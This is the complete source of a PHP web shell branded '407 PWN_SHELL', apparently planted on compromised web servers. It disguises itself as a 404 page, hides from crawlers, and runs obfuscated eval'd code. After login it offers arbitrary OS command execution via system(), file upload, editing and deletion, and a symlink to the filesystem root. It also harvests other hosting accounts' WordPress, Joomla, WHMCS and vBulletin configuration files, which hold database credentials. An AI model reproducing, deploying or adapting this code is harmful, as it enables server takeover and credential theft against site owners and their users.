<?php
session_start();
@set_time_limit(0);

if(version_compare(PHP_VERSION, '5.3.0', '<')) {
	@set_magic_quotes_runtime(0);
}

@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
@error_reporting(0);

$password = "248d4b6c97654f61a59b6b6370cfe33b"; #md5: myshell

$SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
//thanks to Derr Wadowlsky,JaxBCD, 407 Authentic Exploit, dan semua teman saya terutama dia
//fb: Rizz Ex
?>
<!DOCTYPE html>
<html>
 <head>
  <title>404 Not Found</title>
 </head>

 </body>
</html>
<style type="text/css">
body {
    background: black;
    background-size: 100% 100%;
}
html {
	margin: 20px auto;
	background: #000000;
	color: green;
	text-align: center;
}
header {
	color: black;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: white;
	background: transparent;
	border: 1px solid green;
	margin-left: 20px;
	text-align: center;
}
pre{
	color: green;
}
</style>
</head>
<center>
<header>
	<pre>
<center><img src="https://media.giphy.com/media/Sr8hRi7ht1jPhrE8cO/giphy.gif"></center></pre>
</header>
<form method="post">
<input type="password" name="password"><br>
</form>
<?php
eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
exit;
}

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if(empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password)))
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();


if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
}
?>
<style type="text/css">
body {
	
  background: black;
line-height: 1;
color: #fff;
font-family: monospace;
  
  }
  asu{
  	text-align:left;
}
h4{
	font-family: monospace;
	background: #151515;
	color: white;
	font-size: 20px;
	border: 1px solid #02BC8C;
	border-radius: 10px;
}
p{
	text-align: center;
	color: #02BC8C;
	font-family: Courier;
	font-size: 3vh;
	background: black;
}
  th{
  	background:#02BC8C;
  color: black;
}
table, td {
	border-collapse:collapse;
	background: transparent;
	font-family: Monospace ;
	font-size: 13px;
}
input{
	background-color: #151515;
	font-falimy: monospace;
	font-size: 15px;
color: white;
border: 1px solid white;
text-shadow: 5px 5px 30px darkred;
}
textarea { 
font-family: monospace ; 
}
.table_home, .th_home, .td_home{ 
color:white;
border: 1px solid #02BC8C;
}
th {
	padding: 10px;
}
.td_home { padding: 7px; }
select {font-family: Comic Sans MS }
a {color:white}
textarea { width: 100%;height: 400px; }


.hedr {
  font-family: Tahoma, Arial, sans-serif  ;
  font-size: 22px;


}

.cont a{

 text-decoration: none;
 font-family: Monospace  ;
 font-size: 16px;
 text-shadow: 0px 0px 3px ;
 color: #02BC8C;
 border: 1px solid #02BC8C;
border-radius: 10;
}

.cont a:hover{


  color: #02BC8C ;
  border-radius: 10;

}

.tmp tr{

border: solid 1px #BBBBBB;

padding: 2px ;
  font-size: 13px;
}

.tmp tr td a {
  text-decoration: none;



}
#tabnet{
		margin-left:15px auto 0 auto;
		margin-right:15px auto 0 auto;
		border: 1px solid #02BC8C;
		width: 100%;
 }

.foter{
  font-size: 9pt;
  color: #AAAAAA ;
  text-align: center
}

.tmp tr td:hover{

box-shadow: 0px 0px 4px #888888;

}
.fot{

font-family:Tahoma, Arial, sans-serif;

  font-size: 13pt;
}

.ir {
  color: #FF0000;
}
button{
	font-size: 100%;
	border: 1px solid #02BC8C;
	font-family: courier new;
	color: white;
	background: transparent;
	text-decoration:none;
}
a{
	text-decoration:none
}
.meki{
	font-family: monospace;
	color: white;
	text-align: left;
}
h8{
	font-size:11.5px;
	color:#02BC8C;
	font-family:monospace;
	text-align:left;
}
</style>
<?php echo ' ';
$IIIIIIIIIIIl = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$IIIIIIIIIII1 = explode('/', $IIIIIIIIIIIl);
$IIIIIIIIIIIl = str_replace($IIIIIIIIIII1[count($IIIIIIIIIII1) - 1], '', $IIIIIIIIIIIl);;
echo '  </head>
<body><b><center>
<title>407 PWN_SHELL</title>
<p>407PWN_<font color="white">SHELL</p></font></center>
<table align="left">
<font size="3">
<tr><td>
<font color="#02BC8C">System: <font color="white"> '.php_uname().'</center></h8></font></font><br>
<font color="#02BC8C">Server IP: <font color="white">'.$GLOBALS["SERVERIP"].'</center></h8></font></font><br>
<font color="#02BC8C">Your IP: <font color="white">'.$_SERVER['REMOTE_ADDR'].'</center></h8></font></font><br>
<font color="#02BC8C">Info: <font color="white">'.$_SERVER['SERVER_SOFTWARE'].'</center></h8></font></font><br></table>
</br></br></br></br></tr></td></font>
<br>
</br>';

if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = 


getcwd();

}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<font align="left" color=#02BC8C>Current dir : <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</font></font></td></tr>
<tr><td><center>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">File Upload</font><br />';
}else{
echo '<font color="red">Upload Failed !!</font><br />';
}
}
?>
</center>
<br>
<?
echo '</center><form enctype="multipart/form-data" method="POST"><font color="black"><input style="background:silver;font-family: Comic Sans MS " type="file" name="file" />
<input type="submit" value="Upload" />
</form></center>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<br>
</br>
<tr><td><font color='#02BC8C'>Current File : <font color='white'>";
echo $_GET['filesrc'];
echo '</font></tr></td></table><br />';
echo(' <textarea style="width: 100%;height: 400px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
echo '<br>
</br>';
}
//Empety
elseif(isset($_GET['option']) && $_GET['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
//Chmod
if($_GET['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Done </font><br />';
}else{
echo '<font color="red">Change Permission Error </font><br />';
}
}

$ganz = $_GET['path'];
$kamu = $_GET['name'];
$patc = "$ganz/$kamu";

echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($patc)), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Save" />
</form>';
}
//
elseif($_GET['opt'] == 'btw'){
	$cwd = getcwd();
	 echo '<form action="?option&path='.$cwd.'&opt=delete&type=buat" method="POST">
New Name : <input name="name" type="text" size="20" value="Folder" />
<input type="hidden" name="path" value="'.$cwd.'">
<input type="hidden" name="opt" value="delete">
<input type="submit" value="Save" />
</form>';
}
elseif($_GET['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Change Name Done </font><br />';
}else{
echo '<font color="red">Change Name Error </font><br />';
}
$_POST['name'] = $_POST['newname'];
}
$ganz = $_GET['path'];
$kamu = $_GET['name'];
$patc = "$ganz/$kamu";
$new = $_POST['newname'];

echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$new.'" />
<input type="hidden" name="path" value="'.$patc.'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Save" />
</form>';
}
elseif($_GET['opt'] == 'baru'){
	
$ganz = $_GET['path'];
$kamu = $_GET['name'];
$patc = "$ganz/$kamu";
$new = $_POST['newname'];
$azz = $_POST['path'];
$newz = "$azz/$new";


if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Create File Done [ '.$new.' ]</font><br />';
}else{
echo '<font color="red">Create File Error</font><br />';
}
fclose($fp);
}

echo '<form method="POST"> Name : <input name="nama" type="text" size="20" value="'.$new.'" /><input type="submit" name="namaa" value="Create"/></form><br> ';

$ho = $_POST['nama'];

if(isset($_POST['namaa'])){
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($patc)).'</textarea><br />
<input type="hidden" name="path" value="'.$ganz.'/'.$ho.'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
	}
	}
elseif($_GET['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Edit File Done </font><br />';
}else{
echo '<font color="red">Edit File Error </font><br />';
}
fclose($fp);
}
$ganz = $_GET['path'];
$kamu = $_GET['name'];
$patc = "$ganz/$kamu";
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($patc)).'</textarea><br />
<input type="hidden" name="path" value="'.$patc.'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_GET['opt'] == 'delete'){
	
$ganz = $_GET['path'];
$kamu = $_GET['name'];
$patc = "$ganz/$kamu";

//Delete dir
if($_GET['type'] == 'dir'){

if(rmdir($patc)){
echo '<font color="green">Delete File Done</font><br />';
}else{
echo '<font color="red#">Delete File Error </font><br />';
}
}
if($_GET['type'] == 'buat'){
$haaa = $_POST['path'];
$heee = $_POST['name'];
$hooo = "$haaa/$heee";
$new = $haaa.'/'.htmlspecialchars($heee);
if(!mkdir($new)){
echo '<font color="red">Create Folder Error</font><br />';
}else{
echo '<font color="green">Create Folder Done </font><br />';
}
}
elseif($_GET['type'] == 'file'){

$ganz = $_GET['path'];
$kamu = $_GET['name'];
$patc = "$ganz/$kamu";

if(unlink($patc)){
echo '<font color="green">Delete File Done</font><br />';
}else{
echo '<font color="red#">Delete File Error </font><br />';
}
}
}
echo '</center>';
?>
<body>
</table>
<div class=\'all\'>
<?
@mkdir('sym', 0777);
$IIIIIIIIIIl1 = "Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any";
$IIIIIIIIII1I = @fopen('sym/.htaccess', 'w');
fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1);
@symlink('/', 'sym/root');
$IIIIIIIIIlIl = basename('index.php');
if (isset($_REQUEST['sws'])) {
    switch ($_REQUEST['sws']) {
        case 'sec':
            $IIIIIIIIIllI = @file('/etc/named.conf');
            if (!$IIIIIIIIIllI) {
                die(" <font color='red'>can't read /etc/named.conf</font>");
            } else {
                echo "<div class='tmp'>
<table align='center' width='40%'><td> Domains </td><td> Script </td>";
                foreach ($IIIIIIIIIllI as $IIIIIIIIIll1) {
                    if (eregi('zone', $IIIIIIIIIll1)) {
                        preg_match_all('#zone "(.*)"#', $IIIIIIIIIll1, $IIIIIIIIIl11);
                        flush();
                        if (strlen(trim($IIIIIIIIIl11[1][0])) > 2) {
                            $IIIIIIIII1I1 = posix_getpwuid(@fileowner('/etc/valiases/' . $IIIIIIIIIl11[1][0]));
                            $IIIIIIIII1l1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/wp-config.php';
                            $IIIIIIIII11I = get_headers($IIIIIIIII1l1);
                            $IIIIIIIII11l = $IIIIIIIII11I[0];
                            $IIIIIIIII111 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/blog/wp-config.php';
                            $IIIIIIIIlIII = get_headers($IIIIIIIII111);
                            $IIIIIIIIlIIl = $IIIIIIIIlIII[0];
                            $IIIIIIIIlII1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/configuration.php';
                            $IIIIIIIIlIlI = get_headers($IIIIIIIIlII1);
                            $IIIIIIIIlIll = $IIIIIIIIlIlI[0];
                            $IIIIIIIIlIl1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/joomla/configuration.php';
                            $IIIIIIIIlI1I = get_headers($IIIIIIIIlIl1);
                            $IIIIIIIIlI1l = $IIIIIIIIlI1I[0];
                            $IIIIIIIIlI11 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/includes/config.php';
                            $IIIIIIIIllII = get_headers($IIIIIIIIlI11);
                            $IIIIIIIIllIl = $IIIIIIIIllII[0];
                            $IIIIIIIIllI1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/vb/includes/config.php';
                            $IIIIIIIIlllI = get_headers($IIIIIIIIllI1);
                            $IIIIIIIIllll = $IIIIIIIIlllI[0];
                            $IIIIIIIIlll1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/forum/includes/config.php';
                            $IIIIIIIIll1I = get_headers($IIIIIIIIlll1);
                            $IIIIIIIIll1l = $IIIIIIIIll1I[0];
                            $IIIIIIIIll11 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . 'public_html/clients/configuration.php';
                            $IIIIIIIIl1II = get_headers($IIIIIIIIll11);
                            $IIIIIIIIl1Il = $IIIIIIIIl1II[0];
                            $IIIIIIIIl1I1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/support/configuration.php';
                            $IIIIIIIIl1II = get_headers($IIIIIIIIl1I1);
                            $IIIIIIIIl1lI = $IIIIIIIIl1II[0];
                            $IIIIIIIIl1ll = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/client/configuration.php';
                            $IIIIIIIIl1l1 = get_headers($IIIIIIIIl1ll);
                            $IIIIIIIIl11I = $IIIIIIIIl1l1[0];
                            $IIIIIIIIl11l = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/submitticket.php';
                            $IIIIIIIIl111 = get_headers($IIIIIIIIl11l);
                            $IIIIIIII1III = $IIIIIIIIl111[0];
                            $IIIIIIII1IIl = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/client/configuration.php';
                            $IIIIIIII1II1 = get_headers($IIIIIIII1IIl);
                            $IIIIIIII1IlI = $IIIIIIII1II1[0];
                            $IIIIIIII1Ill = strpos($IIIIIIIII11l, '200');
                            $IIIIIIII1I1I = '&nbsp;';
                            if (strpos($IIIIIIIII11l, '200') == true) {
                                $IIIIIIII1I1I = "<a href='" . $IIIIIIIII1l1 . "' target='_blank'>Wordpress</a>";
                            } elseif (strpos($IIIIIIIIlIIl, '200') == true) {
                                $IIIIIIII1I1I = "<a href='" . $IIIIIIIII111 . "' target='_blank'>Wordpress</a>";
                            } elseif (strpos($IIIIIIIIlIll, '200') == true and strpos($IIIIIIII1III, '200') == true) {
                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIl11l . "' target='_blank'>WHMCS</a>";
                            } elseif (strpos($IIIIIIIIl1lI, '200') == true) {
                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIl1I1 . "' target='_blank'>WHMCS</a>";
                            } elseif (strpos($IIIIIIIIl11I, '200') == true) {
                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIl1ll . "' target='_blank'>WHMCS</a>";
                            } elseif (strpos($IIIIIIIIlIll, '200') == true) {
                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIlII1 . "' target='_blank'>Joomla</a>";
                            } elseif (strpos($IIIIIIIIlI1l, '200') == true) {
                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIlIl1 . "' target='_blank'>Joomla</a>";
                            } elseif (strpos($IIIIIIIIllIl, '200') == true) {
                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIlI11 . "' target='_blank'>vBulletin</a>";
                            } elseif (strpos($IIIIIIIIllll, '200') == true) {
                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIllI1 . "' target='_blank'>vBulletin</a>";
                            } elseif (strpos($IIIIIIIIll1l, '200') == true) {
                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIlll1 . "' target='_blank'>vBulletin</a>";
                            } else {
                                continue;
                            }
                            $IIIIIIII1I1l = $IIIIIIIII1I1['name'];
                            echo '<tr><td><a href=http://www.' . $IIIIIIIIIl11[1][0] . '/>' . $IIIIIIIIIl11[1][0] . '</a></td>
<td>' . $IIIIIIII1I1I . '</td></tr>';
                            flush();
                        }
                    }
                }
            }
        break;
        case 'sym':
            $IIIIIIIIIllI = @file('/etc/named.conf');
            if (!$IIIIIIIIIllI) {
                die(" <font color='red'>can't read /etc/named.conf</font>");
            } else {
                echo "<div class='tmp'><table align='center' width='40%'><td>Domains</td><td>Users</td><td>symlink </td>";
                foreach ($IIIIIIIIIllI as $IIIIIIIIIll1) {
                    if (eregi('zone', $IIIIIIIIIll1)) {
                        preg_match_all('#zone "(.*)"#', $IIIIIIIIIll1, $IIIIIIIIIl11);
                        flush();
                        if (strlen(trim($IIIIIIIIIl11[1][0])) > 2) {
                            $IIIIIIIII1I1 = posix_getpwuid(@fileowner('/etc/valiases/' . $IIIIIIIIIl11[1][0]));
                            $IIIIIIII1I1l = $IIIIIIIII1I1['name'];
                            @symlink('/', 'sym/root');
                            $IIIIIIII1I1l = $IIIIIIIIIl11[1][0];
                            $IIIIIIII1I11 = '\.ir';
                            $IIIIIIII1lII = '\.il';
                            if (eregi("$IIIIIIII1I11", $IIIIIIIIIl11[1][0]) or eregi("$IIIIIIII1lII", $IIIIIIIIIl11[1][0])) {
                                $IIIIIIII1I1l = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>" . $IIIIIIIIIl11[1][0] . '</div>';
                            }
                            echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www." . $IIIIIIIIIl11[1][0] . '/>' . $IIIIIIII1I1l . ' </a> </div>
</td>


<td>
' . $IIIIIIIII1I1['name'] . "
</td>






<td>
<a href='sym/root/home/" . $IIIIIIIII1I1['name'] . "/public_html' target='_blank'>symlink </a>
</td>


</tr></div> ";
                            flush();
                        }
                    }
                }
            }
        break;
        case 'file':
            echo '
The file path to symlink

<br /><br />
<form method="post">
<input type="text" name="file" value="/home/user/public_html/file.name" size="60"/><br /><br />
<input type="text" name="symfile" value="file.name_sym ( Ex. :: 1.txt )" size="60"/><br /><br />
<input type="submit" value="symlink" name="symlink" /> <br /><br />



</form>
';
            $IIIIIIII1lIl = $_POST['file'];
            $symfile = $_POST['symfile'];
            $symlink = $_POST['symlink'];
            if ($symlink) {
                @symlink("$IIIIIIII1lIl", "sym/$symfile");
                echo '<br /><a target="_blank" href="sym/' . $symfile . '" >' . $symfile . '</a>';
            }
        break;
        default:
            header("Location: $IIIIIIIIIlIl");
    }
}
?>
</center>
<br>
</br>
<form><font color="white">
    <label for="cmd">[os] Exploit:~$ </label>
    <input type="text" name="cmd" placeholder="_" /></font>
    </form>

</body>
<font color="white" size="4">
<?php
    if(isset($_GET['cmd'])){
        echo "<pre>";
        $asu = system($_GET['cmd']);
        return $asu;
        echo "</pre>";
    }

?>
<?
echo'
<center>
<a href="?">   <button>Home   </a></button>

<a href="?sws=sym"><button>   Domains & Symlink  </a></button>

<a href="?sws=sec"> <button>  Domains & Script   </a></button>

<a href="?sws=file">   <button>Symlink File   </a></button></center>';
?>
<?
$scandir = scandir($path);
$pa = getcwd();
echo ' <table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
<tr>
<th class=th_home><center>File</center></th>
<th class=th_home><center>Size</center></th>
<th class=th_home><center>Perm</center></th>
<th class=th_home><center>Action</center></th>
</tr> <tr>
<td class=td_home>..</td><td class=td_home align=center>NONE</td> <td class=td_home align=center>LINK</td> <td class=td_home align=center> <a href="?option&path='.$pa.'&opt=baru&name=new.php">New File    </a> <a href="?option&path='.$pa.'&opt=btw&type=dir">     New Dir</a> </td></tr>
';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "
<tr>
<td class=td_home><img src='http://www.sclance.com/pngs/file-png/file_png_487779.jpg' width='15px' height='15px'> <a href=\"?path=$path/$dir\">$dir</a></td>
<td class=td_home ><center>DIR</center></td>
<td class=td_home ><center>";
if(is_writable("$path/$dir")) echo '<font color="green">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td class=td_home ><center>
<a href=\"?option&path=$path&opt=rename&type=dir&name=$dir\">Rename</a> <a href=\"?option&path=$path&opt=delete&type=dir&name=$dir\">Delete</a> <a href=\"?option&path=$path&opt=chmod&type=dir&name=$dir\">Chmod</a>

</center></td>
</tr>";
}
echo '<br>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td class=td_home > <img src='http://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/file-text-icon.png' width='15px' height='15'> <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td class=td_home><center>".$size."</center></td>
<td class=td_home><center>";
if(is_writable("$path/$file")) echo '<font color="green">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td class=td_home><center>
<a href=\"?option&path=$path&opt=edit&type=file&name=$file\">Edit</a> <a href=\"?option&path=$path&opt=rename&type=file&name=$file&path=$path\">Rename</a> <a href=\"?option&path=$path&opt=delete&type=file&name=$file\">Delete</a> <a href=\"?option&path=$path&opt=chmod&type=file&name=$file\">Chmod</a>
</center></td>
</tr>";
}
echo '</table>
</div>';
}
?>
</br>
<?
echo '<center><a href="https://www.facebook.com/groups/1217219985083200/"><font color="white">[ 407 Authentic Exploit - Since 2018 ]</font></a></body>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}

?>